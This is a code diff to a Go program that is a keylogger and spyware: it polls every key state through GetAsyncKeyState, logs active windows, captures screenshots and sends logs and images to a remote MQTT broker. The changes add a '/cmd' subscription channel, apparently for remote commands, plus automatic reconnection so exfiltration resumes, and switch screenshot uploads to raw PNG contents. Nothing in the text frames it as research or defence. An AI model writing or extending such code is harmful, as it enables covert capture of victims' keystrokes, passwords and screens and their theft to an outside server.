@@ -11,8 +11,8 @@ import (
 	"github.com/eclipse/paho.mqtt.golang"
 	"github.com/vova616/screenshot"
 	"image"
-	"strings"
 	"image/png"
+	"io/ioutil"
 )
 
 var (
@@ -78,7 +78,7 @@ func windowLogger() {
 
 func keyLogger() {
 	for {
-		time.Sleep(1 * time.Millisecond)
+		//time.Sleep(1 * time.Nanosecond)
 		for KEY := 0; KEY <= 256; KEY++ {
 			time.Sleep(1 * time.Nanosecond)
 			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
@@ -323,7 +323,7 @@ func create(){
 	if token := vClient.Connect(); token.Wait() && token.Error() != nil {
 		panic(token.Error())
 	}
-
+	subscribeChannel(channel + "/cmd")
 }
 
 func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
@@ -362,14 +362,22 @@ func captureScreen(){
 		}
 		err = png.Encode(f, img)
 		if err != nil {
-			panic(err)
+			continue
 		}
+		contents, _ := ioutil.ReadAll(f)
 		f.Close()
-		imgstr := strings.Trim(strings.Join(strings.Fields(fmt.Sprint(img.Pix)), ","), "[]")
+		fmt.Println(len(img.Pix))
 
-		sendMsg(channel+"/img", imgstr, 2, true)
+		sendMsg(channel+"/img", string(contents), 0, true)
 		time.Sleep(10 * time.Minute)
 	}
+}
+
+func subscribeChannel(topic string) mqtt.Token{
+	token := vClient.Subscribe(topic, 0, nil)
+	token.Wait()
+	return token
+
 }
 
 func main() {
@@ -379,13 +387,14 @@ func main() {
 	go windowLogger()
 	go sendLog()
 	//go captureScreen()
-	/*fmt.Println("Press Enter to see logs.")
-	os.Stdin.Read([]byte{0})
-	fmt.Println(tmp	Keylog)*/
-	//MainWindow{}.Run()
+
 	fmt.Println("Press Enter to Exit.")
 	os.Stdin.Read([]byte{0})
 	for {
 		time.Sleep(1 * time.Minute)
+		if !vClient.IsConnected() {
+			vClient.Connect()
+			go sendLog()
+		}
 	}
 }
